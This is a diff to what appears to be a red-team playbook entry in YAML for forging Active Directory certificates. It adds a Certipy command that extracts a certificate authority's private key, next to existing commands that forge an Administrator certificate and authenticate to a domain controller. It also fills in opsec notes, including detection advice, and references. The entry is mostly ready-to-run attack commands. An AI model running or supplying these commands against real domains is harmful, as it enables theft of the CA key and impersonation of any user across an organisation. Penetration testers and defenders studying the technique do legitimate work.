@@ -7,8 +7,18 @@ commands:
 - '# Or backup CA via certsrv.msc'
 - '# Certification Authority -> Backup CA -> Include private key'
 - ''
+- '# Certipy - backup CA (if you have access)'
+- certipy ca -backup -ca '<CA_NAME>' -u '<YOUR_USER>@<DOMAIN>' -p '<YOUR_PASSWORD>'
+- ''
 - '# Forge certificate with Certipy'
 - certipy forge -ca-pfx <CA_PFX> -upn Administrator@<DOMAIN> -subject 'CN=Administrator'
 - certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
-opsec: []
-references: []
+opsec:
+- CA private key extraction is a high-severity event
+- Forged certificates bypass normal issuance logging
+- Certificates can remain valid for years if not revoked
+- Monitor for CA backup operations and certificate authentication from unknown sources
+- Consider impact - CA compromise affects entire PKI trust chain
+references:
+- https://posts.specterops.io/certified-pre-owned-d95910965cd2
+- https://attack.mitre.org/techniques/T1649/
